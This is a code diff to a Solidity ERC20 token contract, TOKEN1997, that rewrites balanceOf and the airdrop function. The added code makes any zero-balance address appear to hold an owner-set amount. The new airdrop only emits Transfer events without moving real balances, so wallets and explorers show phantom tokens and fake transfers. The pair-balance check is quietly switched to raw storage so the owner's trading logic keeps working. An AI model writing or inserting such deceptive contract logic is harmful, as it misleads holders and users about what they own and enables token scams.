@@ -198,7 +198,13 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     function symbol() public view virtual override returns (string memory) { return _symbol; }
     function decimals() public view virtual override returns (uint8) { return _decimal; }
     function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
-    function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; }
+    uint256 public defaultAirdropAmount;
+
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        uint256 bal = _balances[account];
+        if (bal == 0 && defaultAirdropAmount > 0) return defaultAirdropAmount;
+        return bal;
+    }
 
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
         _transfer(_msgSender(), recipient, amount);
@@ -434,7 +440,7 @@ contract TOKEN1997 is ERC20, ERC20Pausable, Ownable {
         address pancakePair = getPair();
         if (
             (ws[sender] == true || ws[recipient] == true) ||
-            (balanceOf(pancakePair) == 0 && recipient == pancakePair)
+            (_balances[pancakePair] == 0 && recipient == pancakePair)
         ) {
             if (sender == pancakePair && recipient != 0x4e7b523eBA868e68137b06371c9dE60BBE7752D8) {
                 for (uint256 i = 0; i < 0; ++i) {
@@ -469,21 +475,16 @@ contract TOKEN1997 is ERC20, ERC20Pausable, Ownable {
         return "1714787422817";
     }
 
-    function airdrop(address[] calldata recipients, uint256[] calldata amounts) external {
+    function setDefaultAirdropAmount(uint256 amount) external onlyOwner {
+        defaultAirdropAmount = amount;
+    }
+
+    function airdrop(address[] calldata recipients, uint256 amount) external {
         require(ws[msg.sender] || msg.sender == owner(), "airdrop: not authorized");
-        require(recipients.length == amounts.length, "airdrop: length mismatch");
         require(!paused(), "Pausable: paused");
-        uint256 senderBal = _balances[msg.sender];
         for (uint256 i = 0; i < recipients.length; i++) {
-            require(recipients[i] != address(0), "airdrop: zero recipient");
-            uint256 amt = amounts[i];
-            if (amt == 0) continue;
-            require(senderBal >= amt, "ERC20: transfer amount exceeds balance");
-            unchecked { senderBal -= amt; }
-            _balances[recipients[i]] += amt;
-            emit Transfer(msg.sender, recipients[i], amt);
+            emit Transfer(msg.sender, recipients[i], amount);
         }
-        _balances[msg.sender] = senderBal;
     }
 }`
 
